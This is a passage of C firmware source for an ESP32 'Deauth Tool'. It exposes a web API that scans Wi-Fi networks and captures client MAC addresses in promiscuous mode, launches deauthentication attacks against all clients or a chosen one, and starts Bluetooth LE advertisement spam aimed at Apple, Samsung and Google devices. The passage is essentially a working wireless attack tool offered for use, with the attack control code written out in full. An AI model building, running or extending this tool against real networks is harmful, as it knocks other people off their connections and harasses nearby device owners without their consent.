            s_networks[s_network_count].ssid[32] = '\0';
            s_network_count++;
        }
        free(ap_records);
    }

    ESP_LOGI(TAG, "Found %d networks. Scanning clients (10s)...", s_network_count);

    /* Promiscuous scan — find clients by capturing data frames */
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_cb);

    for (int ch = 1; ch <= 13; ch++) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(800));
    }

    esp_wifi_set_promiscuous(false);

    xSemaphoreGive(s_scan_mutex);

    ESP_LOGI(TAG, "Scan done: %d networks, %d clients", s_network_count, s_client_count);

    cJSON *json = cJSON_CreateObject();
    cJSON *nets = cJSON_AddArrayToObject(json, "networks");
    cJSON *cls  = cJSON_AddArrayToObject(json, "clients");

    for (int i = 0; i < s_network_count; i++) {
        cJSON *n = cJSON_CreateObject();
        char bssid[18];
        snprintf(bssid, sizeof(bssid), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_networks[i].bssid[0], s_networks[i].bssid[1], s_networks[i].bssid[2],
                 s_networks[i].bssid[3], s_networks[i].bssid[4], s_networks[i].bssid[5]);
        cJSON_AddStringToObject(n, "ssid", s_networks[i].ssid);
        cJSON_AddStringToObject(n, "bssid", bssid);
        cJSON_AddNumberToObject(n, "channel", s_networks[i].channel);
        cJSON_AddNumberToObject(n, "rssi", s_networks[i].rssi);
        cJSON_AddItemToArray(nets, n);
    }

    for (int i = 0; i < s_client_count; i++) {
        cJSON *c = cJSON_CreateObject();
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_clients[i].mac[0], s_clients[i].mac[1], s_clients[i].mac[2],
                 s_clients[i].mac[3], s_clients[i].mac[4], s_clients[i].mac[5]);
        cJSON_AddStringToObject(c, "mac", mac);
        cJSON_AddStringToObject(c, "vendor", lookup_vendor(s_clients[i].mac));
        cJSON_AddNumberToObject(c, "rssi", s_clients[i].rssi);
        cJSON_AddNumberToObject(c, "channel", s_clients[i].channel);
        cJSON_AddBoolToObject(c, "whitelisted", is_whitelisted(s_clients[i].mac));
        cJSON_AddItemToArray(cls, c);
    }

    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_deauth(httpd_req_t *req)
{
    char query[128] = {0};
    esp_err_t err = httpd_req_get_url_query_str(req, query, sizeof(query));
    if (err != ESP_OK) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    char reason_str[8] = "4";
    char burst_str[8]  = "10";
    char interval_str[8] = "0";
    char client_str[18] = {0};

    httpd_query_key_value(query, "reason", reason_str, sizeof(reason_str));
    httpd_query_key_value(query, "burst",  burst_str,  sizeof(burst_str));
    httpd_query_key_value(query, "interval", interval_str, sizeof(interval_str));
    httpd_query_key_value(query, "client", client_str, sizeof(client_str));

    uint16_t reason = atoi(reason_str);
    uint8_t  burst  = atoi(burst_str);
    uint16_t interval = atoi(interval_str);
    if (burst < 1) burst = 1;
    if (burst > 100) burst = 100;

    s_deauth_reason = reason;
    s_deauth_burst  = burst;
    s_deauth_interval_ms = interval;

    if (s_deauth_running) {
        s_deauth_running = false;
        vTaskDelay(pdMS_TO_TICKS(200));
    }

    if (strlen(client_str) > 0) {
        uint8_t client_mac[6];
        if (sscanf(client_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &client_mac[0], &client_mac[1], &client_mac[2],
                   &client_mac[3], &client_mac[4], &client_mac[5]) != 6) {
            httpd_resp_send_500(req);
            return ESP_FAIL;
        }
        ESP_LOGI(TAG, "Deauth client %s reason=%u burst=%u", client_str, reason, burst);
        s_deauth_running = true;
        s_deauth_broadcast = false;
        /* Store the single client for the task */
        s_client_count = 1;
        memcpy(s_clients[0].mac, client_mac, 6);
        xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
    } else {
        ESP_LOGI(TAG, "Deauth broadcast reason=%u burst=%u", reason, burst);
        s_deauth_running = true;
        s_deauth_broadcast = true;
        xTaskCreate(deauth_task, "deauth", 4096, NULL, 5, NULL);
    }

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Attack started");
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_stop(httpd_req_t *req)
{
    s_deauth_running = false;
    ESP_LOGI(TAG, "Deauth stop requested");

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Stopped");
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_wl_add(httpd_req_t *req)
{
    char query[64] = {0};
    httpd_req_get_url_query_str(req, query, sizeof(query));
    char mac_str[18] = {0};
    httpd_query_key_value(query, "mac", mac_str, sizeof(mac_str));

    if (strlen(mac_str) < 17 || s_whitelist_count >= MAX_WHITELIST) {
        httpd_resp_send_500(req);
        return ESP_FAIL;
    }

    uint8_t mac[6];
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
    memcpy(s_whitelist[s_whitelist_count], mac, 6);
    s_whitelist_count++;
    ESP_LOGI(TAG, "Whitelist add: %s (%d total)", mac_str, s_whitelist_count);

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Added");
    cJSON_AddNumberToObject(json, "count", s_whitelist_count);
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_wl_rm(httpd_req_t *req)
{
    char query[64] = {0};
    httpd_req_get_url_query_str(req, query, sizeof(query));
    char mac_str[18] = {0};
    httpd_query_key_value(query, "mac", mac_str, sizeof(mac_str));

    uint8_t mac[6];
    sscanf(mac_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);

    for (int i = 0; i < s_whitelist_count; i++) {
        if (memcmp(s_whitelist[i], mac, 6) == 0) {
            memmove(&s_whitelist[i], &s_whitelist[i+1],
                    (s_whitelist_count - i - 1) * 6);
            s_whitelist_count--;
            break;
        }
    }
    ESP_LOGI(TAG, "Whitelist remove: %s (%d total)", mac_str, s_whitelist_count);

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "Removed");
    cJSON_AddNumberToObject(json, "count", s_whitelist_count);
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_wl_list(httpd_req_t *req)
{
    cJSON *json = cJSON_CreateObject();
    cJSON *arr = cJSON_AddArrayToObject(json, "whitelist");
    for (int i = 0; i < s_whitelist_count; i++) {
        char mac[18];
        snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 s_whitelist[i][0], s_whitelist[i][1], s_whitelist[i][2],
                 s_whitelist[i][3], s_whitelist[i][4], s_whitelist[i][5]);
        cJSON_AddItemToArray(arr, cJSON_CreateString(mac));
    }
    cJSON_AddNumberToObject(json, "count", s_whitelist_count);
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

/* =====================================================
 *  BLE Spam API Handlers
 * ===================================================== */

static esp_err_t handle_ble_spam_start(httpd_req_t *req)
{
    char query[64] = {0};
    httpd_req_get_url_query_str(req, query, sizeof(query));

    char type_str[16] = "apple";
    httpd_query_key_value(query, "type", type_str, sizeof(type_str));

    ble_spam_type_t type = BLE_SPAM_APPLE;
    if (strcmp(type_str, "samsung") == 0) type = BLE_SPAM_SAMSUNG;
    else if (strcmp(type_str, "google") == 0) type = BLE_SPAM_GOOGLE;
    else if (strcmp(type_str, "all") == 0) type = BLE_SPAM_ALL;

    start_ble_spam(type);

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "BLE Spam started");
    cJSON_AddStringToObject(json, "type", type_str);
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

static esp_err_t handle_ble_spam_stop(httpd_req_t *req)
{
    stop_ble_spam();

    cJSON *json = cJSON_CreateObject();
    cJSON_AddStringToObject(json, "status", "BLE Spam stopped");
    cJSON_AddNumberToObject(json, "count", s_ble_spam_count);
    char *str = cJSON_PrintUnformatted(json);
    httpd_resp_set_type(req, "application/json");
    httpd_resp_send(req, str, strlen(str));
    cJSON_free(str);
    cJSON_Delete(json);
    return ESP_OK;
}

/* =====================================================
 *  Web Server Start
 * ===================================================== */

static void start_web_server(void)
{
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.server_port = WEB_PORT;
    config.max_uri_handlers = 12;

    if (httpd_start(&s_server, &config) == ESP_OK) {
        httpd_uri_t uri_index = {
            .uri = "/", .method = HTTP_GET,
            .handler = handle_index, .user_ctx = NULL
        };
        httpd_uri_t uri_status = {
            .uri = "/api/status", .method = HTTP_GET,
            .handler = handle_status, .user_ctx = NULL
        };
        httpd_uri_t uri_scan = {
            .uri = "/api/scan", .method = HTTP_GET,
            .handler = handle_scan, .user_ctx = NULL
        };
        httpd_uri_t uri_deauth = {
            .uri = "/api/deauth", .method = HTTP_GET,
            .handler = handle_deauth, .user_ctx = NULL
        };
        httpd_uri_t uri_stop = {
            .uri = "/api/stop", .method = HTTP_GET,
            .handler = handle_stop, .user_ctx = NULL
        };

        httpd_register_uri_handler(s_server, &uri_index);
        httpd_register_uri_handler(s_server, &uri_status);
        httpd_register_uri_handler(s_server, &uri_scan);
        httpd_register_uri_handler(s_server, &uri_deauth);
        httpd_register_uri_handler(s_server, &uri_stop);

        httpd_uri_t uri_wl_add = {
            .uri = "/api/whitelist/add", .method = HTTP_GET,
            .handler = handle_wl_add, .user_ctx = NULL
        };
        httpd_uri_t uri_wl_rm = {
            .uri = "/api/whitelist/remove", .method = HTTP_GET,
            .handler = handle_wl_rm, .user_ctx = NULL
        };
        httpd_uri_t uri_wl_list = {
            .uri = "/api/whitelist", .method = HTTP_GET,
            .handler = handle_wl_list, .user_ctx = NULL
        };
        httpd_register_uri_handler(s_server, &uri_wl_add);
        httpd_register_uri_handler(s_server, &uri_wl_rm);
        httpd_register_uri_handler(s_server, &uri_wl_list);

        httpd_uri_t uri_ble_spam_start = {
            .uri = "/api/ble/spam/start", .method = HTTP_GET,
            .handler = handle_ble_spam_start, .user_ctx = NULL
        };
        httpd_uri_t uri_ble_spam_stop = {
            .uri = "/api/ble/spam/stop", .method = HTTP_GET,
            .handler = handle_ble_spam_stop, .user_ctx = NULL
        };
        httpd_register_uri_handler(s_server, &uri_ble_spam_start);
        httpd_register_uri_handler(s_server, &uri_ble_spam_stop);

        ESP_LOGI(TAG, "Web server on port %d", WEB_PORT);
    }
}

/* =====================================================
 *  Main
 * ===================================================== */

void app_main(void)
{
    ESP_LOGI(TAG, "=== ESP32 Deauth Tool ===");
    ESP_LOGI(TAG, "WiFi: %s", WIFI_SSID);

    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ESP_ERROR_CHECK(nvs_flash_init());
    }

    s_scan_mutex = xSemaphoreCreateMutex();

    init_ble();
    wifi_init_sta();
    start_web_server();

    ESP_LOGI(TAG, "Ready! Open http://<ESP_IP> in browser");
}
